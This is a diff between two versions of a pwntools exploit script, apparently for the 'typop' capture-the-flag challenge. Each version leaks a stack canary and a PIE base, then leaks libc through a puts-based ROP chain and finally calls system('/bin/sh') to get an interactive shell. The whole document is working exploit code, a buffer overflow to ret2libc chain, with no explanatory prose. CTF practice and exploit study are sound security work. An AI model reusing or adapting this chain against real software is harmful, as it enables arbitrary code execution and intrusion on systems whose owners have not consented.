@@ -1,66 +1,63 @@
 from pwn import *
+from six import b
 
-context.arch = 'amd64'
-context.log_level = 'DEBUG'
+context.log_level = 'debug'
+#context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 
-e = ELF('./chall')
-p = process('./chall')
-#p = remote('typop.chal.idek.team', 1337)
-libc = ELF('./libc.so.6')
+f_debug = False if "remote" in sys.argv else True
 
-# (1) canary, stack leak
-p.sendlineafter('survey?\n', 'y')
-p.sendafter('ctf?\n', 'A' * 10 + 'B')
+vuln_name = "./chall"
+libc_path = "./libc.so.6"
 
-p.recvuntil('B')
-canary = u64(b'\x00' + p.recv(7))
-stack = u64(p.recv(6).ljust(8, b'\x00'))
-info('canary: ' + hex(canary))
-info('stack: ' + hex(stack))
+elf, rop = ELF(vuln_name), ROP(vuln_name)
+libc, roplibc = ELF(libc_path), ROP(libc_path)
 
-p.sendafter('feedback?\n', b'A' * 10 + p64(canary))
+if f_debug:
+    io = process(vuln_name)
+else:
+    io = remote("", 1111)
 
-# (2) pie base leak
-p.sendlineafter('survey?\n', 'y')
-p.sendafter('ctf?\n', b'A' * 10 + b'B' * 8 + b'C' * 7 + b'D')
 
-p.recvuntil('D')
-e.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x1447
-info('pie base: ' + hex(e.address))
+def ddebug():
+    gdb.attach(io)
+    pause()
 
-info(hex(e.address + 0x14d3))
-pop_rdi = e.address + 0x14d3
-ret = e.address + 0x101a
 
-payload = b''
-payload += b'A' * (0x12 - 0x8)
-payload += p64(canary)
-payload += b'B' * 0x8
-payload += p64(pop_rdi)
-payload += p64(e.got['puts'])
+# canary
+io.sendlineafter("Do you want to complete a survey?\n", "y")
+io.sendafter("ctf?\n", "a" * 10 + "b")
+io.recvuntil('b')
+canary = u64(b"\00" + io.recv(7))
+success("canary -> " + hex(canary))
+io.sendafter("feedback?\n", b"a" * 10 + p64(canary))
+
+# pie leak
+io.sendlineafter("Do you want to complete a survey?\n", "y")
+io.sendafter("ctf?\n", b"a" * 10 + b"a" * 8 + b"b" * 7 + b"c")
+io.recvuntil("c")
+elf.address = u64(io.recv(6).ljust(8, b"\x00")) - 55 - elf.symbols["main"]
+success("elf.address -> " + hex(elf.address))
+
+# libc
+pop_rdi = elf.address + 0x14d3
+payload = b"a" * 10 + p64(canary)
+payload += b"f" * 8
+payload += p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
+payload += p64(elf.symbols["main"])
+io.sendafter("feedback?\n", payload)
+libcputs_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
+libc.address = libcputs_offset - libc.symbols["puts"]
+success("libc address -> " + hex(libc.address))
+
+# system
+io.sendlineafter("Do you want to complete a survey?\n", "y")
+io.sendafter("ctf?\n", "a")
+ret = elf.address + 0x101a
+payload = b"a" * 10 + p64(canary)
+payload += b"f" * 8
+payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
 payload += p64(ret)
-payload += p64(e.plt['printf'])
-payload += p64(ret)
-payload += p64(e.address + 0x1410) # main
+payload += p64(libc.symbols["system"])
+io.sendafter("feedback?\n", payload)
 
-p.sendafter('feedback?\n', payload)
-
-libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 0x84420
-info(hex(libc.address))
-
-# (3) system('/bin/sh\x00')
-p.sendlineafter('survey?\n', 'y')
-p.sendafter('ctf?\n', b'A')
-
-payload = b''
-payload += b'A' * (0x12 - 0x8)
-payload += p64(canary)
-payload += b'B' * 0x8
-payload += p64(pop_rdi)
-payload += p64(next(libc.search(b'/bin/sh\x00')))
-payload += p64(ret)
-payload += p64(libc.sym['system'])
-
-p.sendafter('feedback?\n', payload)
-
-p.interactive()
+io.interactive()
